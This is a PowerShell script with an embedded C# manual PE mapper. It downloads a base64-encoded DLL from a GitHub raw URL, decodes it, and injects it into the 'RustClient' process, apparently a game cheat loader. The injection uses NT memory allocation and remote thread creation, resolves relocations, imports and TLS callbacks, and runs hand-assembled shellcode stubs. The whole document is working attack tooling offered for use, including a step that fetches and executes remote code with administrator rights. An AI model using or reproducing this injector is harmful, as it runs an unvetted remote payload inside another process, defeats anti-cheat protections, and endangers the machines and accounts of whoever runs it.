<#
    Manual PE Mapping v3 — с корректной трансляцией импортов в адресное пространство цели.
    Требования: RustClient x64, PowerShell x64, админ.
#>

$ErrorActionPreference = 'Stop'

$MapperCode = @"
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

public static class ManualMapper
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibraryA(string name);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr h, string name);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr h, IntPtr ord);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr h, uint ms);

    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(IntPtr h, ref IntPtr addr, IntPtr zero, ref UIntPtr size, uint allocType, uint prot);
    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(IntPtr h, IntPtr addr, byte[] buf, UIntPtr size, out UIntPtr written);
    [DllImport("ntdll.dll")]
    public static extern uint NtProtectVirtualMemory(IntPtr h, ref IntPtr addr, ref UIntPtr size, uint newProt, out uint oldProt);
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(out IntPtr hThread, uint access, IntPtr objAttr, IntPtr hProcess, IntPtr start, IntPtr arg, bool suspended, uint zeroBits, uint stackCommit, uint stackReserve, IntPtr attrList);

    private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint PAGE_READWRITE = 0x04;
    private const uint PAGE_READONLY = 0x02;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint THREAD_ALL_ACCESS = 0x1F03FF;
    private const uint SCN_MEM_EXECUTE = 0x20000000;
    private const uint SCN_MEM_WRITE = 0x80000000;

    private static uint R32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
    private static ushort R16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }

    private static Dictionary<string, ulong> GetTargetModules(int pid)
    {
        var d = new Dictionary<string, ulong>(StringComparer.OrdinalIgnoreCase);
        try
        {
            var p = System.Diagnostics.Process.GetProcessById(pid);
            foreach (System.Diagnostics.ProcessModule m in p.Modules)
            {
                string n = m.ModuleName;
                ulong b = (ulong)m.BaseAddress.ToInt64();
                d[n] = b;
                if (n.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                    d[n.Substring(0, n.Length - 4)] = b;
            }
        }
        catch (Exception ex) { Console.WriteLine("[mapper] WARN: modules enum: " + ex.Message); }
        return d;
    }

    private static ulong RemoteLoadLibrary(IntPtr hProcess, int pid, string dllName, Dictionary<string, ulong> tmods)
    {
        IntPtr ourK32 = GetModuleHandle("kernel32.dll");
        IntPtr ourLL = GetProcAddress(ourK32, "LoadLibraryA");
        if (ourLL == IntPtr.Zero) throw new Exception("our kernel32!LoadLibraryA missing");
        ulong off = (ulong)ourLL.ToInt64() - (ulong)ourK32.ToInt64();
        ulong tK32;
        if (!tmods.TryGetValue("kernel32.dll", out tK32)) throw new Exception("kernel32 not in target");
        IntPtr remoteLL = (IntPtr)(tK32 + off);

        byte[] nb = Encoding.ASCII.GetBytes(dllName + "\0");
        IntPtr rStr = IntPtr.Zero;
        UIntPtr ss = (UIntPtr)nb.Length;
        uint st = NtAllocateVirtualMemory(hProcess, ref rStr, IntPtr.Zero, ref ss, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (st != 0) throw new Exception("alloc string: 0x" + st.ToString("X"));
        UIntPtr w;
        st = NtWriteVirtualMemory(hProcess, rStr, nb, (UIntPtr)nb.Length, out w);
        if (st != 0) throw new Exception("write string: 0x" + st.ToString("X"));

        IntPtr hT;
        st = NtCreateThreadEx(out hT, THREAD_ALL_ACCESS, IntPtr.Zero, hProcess, remoteLL, rStr, false, 0, 0x1000, 0x100000, IntPtr.Zero);
        if (st != 0) throw new Exception("remote LoadLibrary thread: 0x" + st.ToString("X"));
        WaitForSingleObject(hT, 5000);
        CloseHandle(hT);
        System.Threading.Thread.Sleep(150);

        var refreshed = GetTargetModules(pid);
        foreach (var kv in refreshed) tmods[kv.Key] = kv.Value;

        ulong tb;
        if (tmods.TryGetValue(dllName, out tb)) return tb;
        string noext = dllName.EndsWith(".dll", StringComparison.OrdinalIgnoreCase) ? dllName.Substring(0, dllName.Length - 4) : dllName;
        if (tmods.TryGetValue(noext, out tb)) return tb;
        return 0;
    }

    private static void RegisterSeh(IntPtr hProcess, Dictionary<string, ulong> tmods, ulong pdataVA, uint count, ulong imageBase)
    {
        if (count == 0) return;
        IntPtr ourNt = GetModuleHandle("ntdll.dll");
        IntPtr ourRtl = GetProcAddress(ourNt, "RtlAddFunctionTable");
        if (ourRtl == IntPtr.Zero) { Console.WriteLine("[mapper] RtlAddFunctionTable not found"); return; }
        ulong tNt;
        if (!tmods.TryGetValue("ntdll.dll", out tNt)) { Console.WriteLine("[mapper] ntdll not in target"); return; }
        ulong off = (ulong)ourRtl.ToInt64() - (ulong)ourNt.ToInt64();
        ulong tRtl = tNt + off;

        byte[] sc;
        using (var ms = new MemoryStream())
        {
            var b = new BinaryWriter(ms);
            b.Write(new byte[] { 0x48, 0xB9 }); b.Write(pdataVA);
            b.Write(new byte[] { 0x48, 0xC7, 0xC2 }); b.Write(count);
            b.Write(new byte[] { 0x49, 0xB8 }); b.Write(imageBase);
            b.Write(new byte[] { 0x48, 0xB8 }); b.Write(tRtl);
            b.Write(new byte[] { 0x48, 0x83, 0xEC, 0x28 });
            b.Write(new byte[] { 0xFF, 0xD0 });
            b.Write(new byte[] { 0x48, 0x83, 0xC4, 0x28 });
            b.Write((byte)0xC3);
            b.Flush();
            sc = ms.ToArray();
        }
        IntPtr sa = IntPtr.Zero;
        UIntPtr sz = (UIntPtr)sc.Length;
        uint st = NtAllocateVirtualMemory(hProcess, ref sa, IntPtr.Zero, ref sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (st != 0) return;
        UIntPtr w;
        st = NtWriteVirtualMemory(hProcess, sa, sc, (UIntPtr)sc.Length, out w);
        if (st != 0) return;
        IntPtr hT;
        st = NtCreateThreadEx(out hT, THREAD_ALL_ACCESS, IntPtr.Zero, hProcess, sa, IntPtr.Zero, false, 0, 0x1000, 0x100000, IntPtr.Zero);
        if (st != 0) return;
        WaitForSingleObject(hT, 5000);
        CloseHandle(hT);
        Console.WriteLine("[mapper] SEH registered: " + count + " entries");
    }

    public static void Inject(int pid, byte[] dllBytes)
    {
        Console.WriteLine("[mapper] Size: " + dllBytes.Length);
        int e_lfanew = BitConverter.ToInt32(dllBytes, 0x3C);
        if (R32(dllBytes, e_lfanew) != 0x00004550) throw new Exception("Bad PE");
        ushort machine = R16(dllBytes, e_lfanew + 4);
        Console.WriteLine("[mapper] Machine: 0x" + machine.ToString("X"));
        if (machine != 0x8664) throw new Exception("Not x64");

        ushort nsec = R16(dllBytes, e_lfanew + 6);
        ushort optSz = R16(dllBytes, e_lfanew + 20);
        int opt = e_lfanew + 24;
        if (R16(dllBytes, opt) != 0x20B) throw new Exception("Not PE32+");

        ulong prefBase = BitConverter.ToUInt64(dllBytes, opt + 24);
        uint imgSize = R32(dllBytes, opt + 56);
        uint hdrSize = R32(dllBytes, opt + 60);
        uint ep = R32(dllBytes, opt + 16);
        int dd = opt + 112;

        if (R32(dllBytes, dd + 14 * 8) != 0) throw new Exception("Managed (.NET) not supported");

        uint impRVA = R32(dllBytes, dd + 1 * 8);
        uint relocRVA = R32(dllBytes, dd + 5 * 8);
        uint relocSz = R32(dllBytes, dd + 5 * 8 + 4);
        uint tlsRVA = R32(dllBytes, dd + 9 * 8);
        uint excRVA = R32(dllBytes, dd + 3 * 8);
        uint excSz = R32(dllBytes, dd + 3 * 8 + 4);

        int sectOff = opt + optSz;
        var sections = new List<uint[]>();
        for (int i = 0; i < nsec; i++)
        {
            int o = sectOff + i * 40;
            sections.Add(new uint[] { R32(dllBytes, o + 12), R32(dllBytes, o + 8), R32(dllBytes, o + 20), R32(dllBytes, o + 16), R32(dllBytes, o + 36) });
        }
        Func<uint, int> rvaToOff = (rva) =>
        {
            foreach (var s in sections)
                if (rva >= s[0] && rva < s[0] + s[1]) return (int)(s[2] + (rva - s[0]));
            return -1;
        };

        IntPtr hp = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hp == IntPtr.Zero) throw new Exception("OpenProcess: " + Marshal.GetLastWin32Error());

        try
        {
            var tmods = GetTargetModules(pid);
            Console.WriteLine("[mapper] Target modules enumerated: " + tmods.Count);

            IntPtr rb = IntPtr.Zero;
            UIntPtr asz = (UIntPtr)imgSize;
            uint st = NtAllocateVirtualMemory(hp, ref rb, IntPtr.Zero, ref asz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (st != 0) throw new Exception("Alloc: 0x" + st.ToString("X"));
            ulong rbv = (ulong)rb.ToInt64();
            Console.WriteLine("[mapper] RemoteBase: 0x" + rbv.ToString("X"));

            ulong delta = rbv - prefBase;

            // ---- Relocs ----
            if (delta != 0)
            {
                if (relocRVA == 0 || relocSz == 0) throw new Exception("No relocs, DLL cannot relocate. Rebuild with /DYNAMICBASE.");
                int p = rvaToOff(relocRVA);
                int end = p + (int)relocSz;
                while (p < end)
                {
                    uint pr = R32(dllBytes, p), bs = R32(dllBytes, p + 4);
                    if (bs < 8) break;
                    int n = (int)((bs - 8) / 2);
                    for (int i = 0; i < n; i++)
                    {
                        ushort e = BitConverter.ToUInt16(dllBytes, p + 8 + i * 2);
                        int t = e >> 12, off = e & 0xFFF;
                        if (t == 0) continue;
                        int po = rvaToOff(pr + (uint)off);
                        if (po < 0) continue;
                        if (t == 10) { ulong v = BitConverter.ToUInt64(dllBytes, po) + delta; Array.Copy(BitConverter.GetBytes(v), 0, dllBytes, po, 8); }
                        else if (t == 3) { uint v = R32(dllBytes, po) + (uint)delta; Array.Copy(BitConverter.GetBytes(v), 0, dllBytes, po, 4); }
                    }
                    p += (int)bs;
                }
            }

            // ---- Imports (FIXED: resolve in target space) ----
            if (impRVA != 0)
            {
                int impOff = rvaToOff(impRVA);
                int i = 0;
                while (true)
                {
                    int descOff = impOff + i * 20;
                    uint oft = R32(dllBytes, descOff);
                    uint nRVA = R32(dllBytes, descOff + 12);
                    uint ft = R32(dllBytes, descOff + 16);
                    if (nRVA == 0) break;

                    int nOff = rvaToOff(nRVA);
                    var sb = new StringBuilder();
                    while (dllBytes[nOff] != 0) sb.Append((char)dllBytes[nOff++]);
                    string dllName = sb.ToString();

                    IntPtr ourMod = LoadLibraryA(dllName);
                    if (ourMod == IntPtr.Zero) throw new Exception("Local LoadLibrary failed: " + dllName + " (install VC++ Redist x64?)");
                    ulong ourBase = (ulong)ourMod.ToInt64();

                    ulong tBase = 0;
                    if (!tmods.TryGetValue(dllName, out tBase))
                    {
                        string nx = dllName.EndsWith(".dll", StringComparison.OrdinalIgnoreCase) ? dllName.Substring(0, dllName.Length - 4) : dllName;
                        if (!tmods.TryGetValue(nx, out tBase))
                        {
                            Console.WriteLine("[mapper]   " + dllName + " not in target, loading remotely");
                            tBase = RemoteLoadLibrary(hp, pid, dllName, tmods);
                            if (tBase == 0) throw new Exception("Cannot load " + dllName + " in target");
                        }
                    }
                    Console.WriteLine("[mapper] Import " + dllName + " our=0x" + ourBase.ToString("X") + " tgt=0x" + tBase.ToString("X"));

                    uint thunkRVA = oft != 0 ? oft : ft;
                    int thunkOff = rvaToOff(thunkRVA);
                    int iatOff = rvaToOff(ft);
                    int j = 0;
                    while (true)
                    {
                        ulong val = BitConverter.ToUInt64(dllBytes, thunkOff + j * 8);
                        if (val == 0) break;
                        IntPtr ourFunc;
                        if ((val & 0x8000000000000000UL) != 0)
                            ourFunc = GetProcAddress(ourMod, (IntPtr)(val & 0xFFFF));
                        else
                        {
                            int hn = rvaToOff((uint)val);
                            int ns = hn + 2;
                            var fn = new StringBuilder();
                            while (dllBytes[ns] != 0) fn.Append((char)dllBytes[ns++]);
                            ourFunc = GetProcAddress(ourMod, fn.ToString());
                        }
                        if (ourFunc == IntPtr.Zero) throw new Exception("GetProcAddress: " + dllName);

                        // THE KEY LINE: offset within module is ASLR-invariant
                        ulong offInMod = (ulong)ourFunc.ToInt64() - ourBase;
                        ulong tFunc = tBase + offInMod;
                        Array.Copy(BitConverter.GetBytes(tFunc), 0, dllBytes, iatOff + j * 8, 8);
                        j++;
                    }
                    i++;
                }
            }

            // ---- TLS callbacks (FIXED) ----
            var tlsCbs = new List<ulong>();
            if (tlsRVA != 0)
            {
                int tOff = rvaToOff(tlsRVA);
                ulong cbVA = BitConverter.ToUInt64(dllBytes, tOff + 24);
                if (cbVA != 0)
                {
                    int cbRVA = (int)(cbVA - rbv);
                    int cbFile = rvaToOff((uint)cbRVA);
                    if (cbFile >= 0)
                    {
                        int k = 0;
                        while (true)
                        {
                            ulong e = BitConverter.ToUInt64(dllBytes, cbFile + k * 8);
                            if (e == 0) break;
                            tlsCbs.Add(e);
                            k++;
                            if (k > 1024) break;
                        }
                    }
                }
                Console.WriteLine("[mapper] TLS callbacks: " + tlsCbs.Count);
            }

            // ---- Write headers + sections ----
            byte[] hdr = new byte[hdrSize];
            Array.Copy(dllBytes, 0, hdr, 0, (int)hdrSize);
            UIntPtr w;
            st = NtWriteVirtualMemory(hp, rb, hdr, (UIntPtr)hdrSize, out w);
            if (st != 0) throw new Exception("WriteHdr: 0x" + st.ToString("X"));

            foreach (var s in sections)
            {
                uint cp = Math.Min(s[1], s[3]);
                if (cp == 0) continue;
                byte[] sec = new byte[cp];
                Array.Copy(dllBytes, (int)s[2], sec, 0, (int)cp);
                st = NtWriteVirtualMemory(hp, IntPtr.Add(rb, (int)s[0]), sec, (UIntPtr)cp, out w);
                if (st != 0) throw new Exception("WriteSec: 0x" + st.ToString("X"));
            }

            // ---- Protections ----
            foreach (var s in sections)
            {
                if (s[1] == 0) continue;
                bool exe = (s[4] & SCN_MEM_EXECUTE) != 0, wr = (s[4] & SCN_MEM_WRITE) != 0;
                uint prot = PAGE_READONLY;
                if (exe && wr) prot = PAGE_EXECUTE_READWRITE;
                else if (exe) prot = PAGE_EXECUTE_READ;
                else if (wr) prot = PAGE_READWRITE;
                IntPtr sa = IntPtr.Add(rb, (int)s[0]);
                UIntPtr ss = (UIntPtr)s[1];
                uint old;
                NtProtectVirtualMemory(hp, ref sa, ref ss, prot, out old);
            }

            // ---- SEH (.pdata) ----
            if (excRVA != 0 && excSz > 0)
                RegisterSeh(hp, tmods, rbv + excRVA, excSz / 12, rbv);

            // ---- Stub: TLS cbs -> DllMain ----
            ulong dm = rbv + ep;
            byte[] sc;
            using (var ms = new MemoryStream())
            {
                var b = new BinaryWriter(ms);
                foreach (var cb in tlsCbs)
                {
                    b.Write(new byte[] { 0x48, 0xB9 }); b.Write(rbv);
                    b.Write(new byte[] { 0x48, 0xBA }); b.Write((ulong)1);
                    b.Write(new byte[] { 0x4D, 0x31, 0xC0 });
                    b.Write(new byte[] { 0x48, 0xB8 }); b.Write(cb);
                    b.Write(new byte[] { 0x48, 0x83, 0xEC, 0x28 });
                    b.Write(new byte[] { 0xFF, 0xD0 });
                    b.Write(new byte[] { 0x48, 0x83, 0xC4, 0x28 });
                }
                b.Write(new byte[] { 0x48, 0xB9 }); b.Write(rbv);
                b.Write(new byte[] { 0x48, 0xBA }); b.Write((ulong)1);
                b.Write(new byte[] { 0x4D, 0x31, 0xC0 });
                b.Write(new byte[] { 0x48, 0xB8 }); b.Write(dm);
                b.Write(new byte[] { 0x48, 0x83, 0xEC, 0x28 });
                b.Write(new byte[] { 0xFF, 0xD0 });
                b.Write(new byte[] { 0x48, 0x83, 0xC4, 0x28 });
                b.Write((byte)0xC3);
                b.Flush();
                sc = ms.ToArray();
            }

            IntPtr scA = IntPtr.Zero;
            UIntPtr scS = (UIntPtr)sc.Length;
            st = NtAllocateVirtualMemory(hp, ref scA, IntPtr.Zero, ref scS, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (st != 0) throw new Exception("AllocSc: 0x" + st.ToString("X"));
            st = NtWriteVirtualMemory(hp, scA, sc, (UIntPtr)sc.Length, out w);
            if (st != 0) throw new Exception("WriteSc: 0x" + st.ToString("X"));
            Console.WriteLine("[mapper] Stub: 0x" + scA.ToInt64().ToString("X") + " (" + sc.Length + "b)");

            IntPtr hT;
            st = NtCreateThreadEx(out hT, THREAD_ALL_ACCESS, IntPtr.Zero, hp, scA, IntPtr.Zero, false, 0, 0x1000, 0x100000, IntPtr.Zero);
            if (st != 0) throw new Exception("Thread: 0x" + st.ToString("X"));
            CloseHandle(hT);
            Console.WriteLine("[mapper] Thread started.");
        }
        finally { CloseHandle(hp); }
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]'ManualMapper').Type) {
    Add-Type -TypeDefinition $MapperCode -Language CSharp
}

$Url = "https://raw.githubusercontent.com/PUZAN1337/-/refs/heads/main/svin.dll"
$TargetProcessName = "RustClient"

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) { Write-Host "[!] Need admin." -ForegroundColor Red; return }

try {
    $b64 = (Invoke-RestMethod -Uri $Url -UseBasicParsing -ErrorAction Stop) -replace '\s', ''
    Write-Host "[+] Base64 length: $($b64.Length)" -ForegroundColor Green
    $dllBytes = [System.Convert]::FromBase64String($b64)
} catch { Write-Error "Download/decode: $($_.Exception.Message)"; return }
if ($dllBytes[0] -ne 0x4D -or $dllBytes[1] -ne 0x5A) { Write-Warning "No MZ."; return }

$p = Get-Process -Name $TargetProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $p) { Write-Host "[!] '$TargetProcessName' not found." -ForegroundColor Yellow; return }
Write-Host "[+] Target: $($p.ProcessName) (PID $($p.Id))" -ForegroundColor Cyan

try {
    [ManualMapper]::Inject($p.Id, $dllBytes)
    Write-Host "[+] Done." -ForegroundColor Green
} catch {
    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
}
